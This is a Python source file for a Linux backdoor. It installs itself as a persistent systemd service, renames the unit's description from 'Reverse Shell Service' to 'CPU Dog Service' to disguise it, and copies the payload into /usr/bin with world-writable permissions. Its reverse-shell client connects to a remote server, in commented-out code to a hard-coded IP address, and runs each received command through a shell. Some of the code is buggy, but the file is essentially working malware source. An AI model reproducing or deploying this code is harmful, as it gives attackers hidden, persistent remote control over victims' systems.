import os
import socket
import platform
import subprocess
from time import sleep

class Vic:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_ip_port = server_port
    
    # persistent service ||  Could be a dummy service that could be used to hide the real service 
    def service_init():
        try:
            # check what init system is being used
            # check if windows or linux
            if platform.system() == 'Windows':
                file_name = os.path.basename(__file__)
                path = os.getcwd()
                
                print("[*]: {0}".format(platform.system()))
                print("[*]: Under Development")
                print("[*]: Payload Path: {0}".format(path))
                print("[*]: Payload Name: {0}".format(file_name))
                print("[*]: Payload Path: {0}".format(path))
                sleep(5)
                
                return exit()

            # persistent service
            # find what system is being used
            if platform.system() == 'Linux': 
                path = '/etc/systemd/system/rev_shell.service'
                Execpath = '/home/owner/Downloads/Linuxbackdoor/payload/payload.py'

                service = '''
                    [Unit]
                    Description=Reverse Shell Service
                    After=network.target
                    [Service]
                    ExecStart=/usr/bin/python3 {0}
                    Restart=always
                    RestartSec=5
                    [Install]
                    WantedBy=multi-user.target
                        '''.format(Execpath)
                with open(path, 'w') as f:
                    f.write(service)
                subprocess.call(['systemctl', 'daemon-reload'])
                subprocess.call(['systemctl', 'enable', 'rev_shell.service'])
                subprocess.call(['systemctl', 'start', 'rev_shell.service'])
            else:
                print("Was not able to find the init system")
                return exit()
        except Exception as e:
            print("" % e)
        return 

    def rewrite_service_init():
        file_name = os.path.basename(__file__)
        # this is going to rewrite the service file and move the executable to the new location
        try:
            # persistent service
            path = '/etc/systemd/system/rev_shell.service'
            Execpath = '/usr/bin/{0}'.format(file_name)

            service = '''
[Unit]
Description=CPU Dog Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {0}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
'''.format(Execpath)
            with open(path, 'w') as f:
                f.write(service)
        # save the service file
        finally:
            subprocess.call(['systemctl', 'daemon-reload'])
            subprocess.call(['systemctl', 'enable', 'rev_shell.service'])
            subprocess.call(['systemctl', 'start', 'rev_shell.service'])
        # move the executable to the tmp directory
        try:
            subprocess.call(['mv', '/home/owner/Downloads/Linuxbackdoor/payload/payload.py', '/usr/bin/payload.py'])
            # if the file is not found, it will throw an exception, so we need to create the file
            if FileNotFoundError:
                subprocess.call(['touch', '/usr/bin/payload.py'])
                subprocess.call(['mv', '/home/owner/Downloads/Linuxbackdoor/payload/payload.py', '/usr/bin/payload.py'])
        except Exception as e:
            print("" % e)
        finally:

            subprocess.call(['chmod', '777', '/usr/bin/payload.py'])
            subprocess.call(['systemctl', 'daemon-reload'])
            subprocess.call(['systemctl', 'enable', 'rev_shell.service'])
            subprocess.call(['systemctl', 'start', 'rev_shell.service'])

    def service_stop():
        try:
            subprocess.call(['systemctl', 'stop', 'rev_shell.service'])
            subprocess.call(['systemctl', 'disable', 'rev_shell.service'])
            subprocess.call(['rm', '/etc/systemd/system/rev_shell.service'])
            subprocess.call(['systemctl', 'daemon-reload'])
        except Exception as e:
            print(e)
        return

    def connect_to_server(self):
        
        print("####################################")
        print("########## Client Program ##########")
        print("####################################")

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client Initiated...")
        self.client.connect((self.server_ip, self.server_ip_port))
        print("Msg: Connection initiated...")

    def online_interaction(self):
        while True:
            user_command = self.client.recv(1024).decode()
            # print("received command: $ ", user_command)
            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            if output == b"" and output_error == b"":
                self.client.send(b"client_msg: no visible output")
            else:
                return self.client.send(output + output_error)
            

def Init():
    Vic.service_init()
    Vic.rewrite_service_init()

def main():
    #choice = "online"  # "offline"
    #victim = Vic('173.230.140.32', 999)

    #victim.connect_to_server()

    #if choice == "online":
    #    victim.online_interaction()

    return None

if __name__ == '__main__':
    Init()
